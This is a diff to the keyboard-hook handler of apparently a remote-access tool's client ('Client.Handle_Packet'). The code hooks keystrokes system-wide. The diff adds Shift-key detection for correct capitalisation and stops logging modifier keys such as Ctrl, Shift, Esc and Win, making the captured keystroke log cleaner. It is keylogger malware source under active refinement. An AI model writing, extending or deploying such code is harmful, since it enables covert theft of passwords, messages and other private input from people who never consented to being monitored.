@@ -56,10 +56,11 @@ namespace Client.Handle_Packet
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                 {
                     int vkCode = Marshal.ReadInt32(lParam);
-                    bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
+                    bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
+                    bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                     string currentKey = KeyboardLayout((uint)vkCode);
 
-                    if (CapsLock)
+                    if (capsLock || shiftPress)
                     {
                         currentKey = KeyboardLayout((uint)vkCode).ToUpper();
                     }
@@ -82,25 +83,31 @@ namespace Client.Handle_Packet
                                 currentKey = "[ENTER]\n";
                                 break;
                             case "Escape":
-                                currentKey = "[ESC]\n";
+                                //currentKey = "[ESC]\n";
+                                currentKey = "";
                                 break;
                             case "LControlKey":
-                                currentKey = "[CTRL]";
+                                //currentKey = "[CTRL]";
+                                currentKey = "";
                                 break;
                             case "RControlKey":
-                                currentKey = "[CTRL]";
+                                //currentKey = "[CTRL]";
+                                currentKey = "";
                                 break;
                             case "RShiftKey":
-                                currentKey = "[Shift]";
+                                //currentKey = "[Shift]";
+                                currentKey = "";
                                 break;
                             case "LShiftKey":
-                                currentKey = "[Shift]";
+                                //currentKey = "[Shift]";
+                                currentKey = "";
                                 break;
                             case "Back":
                                 currentKey = "[Back]";
                                 break;
                             case "LWin":
-                                currentKey = "[WIN]";
+                                //currentKey = "[WIN]";
+                                currentKey = "";
                                 break;
                             case "Tab":
                                 currentKey = "[Tab]\n";
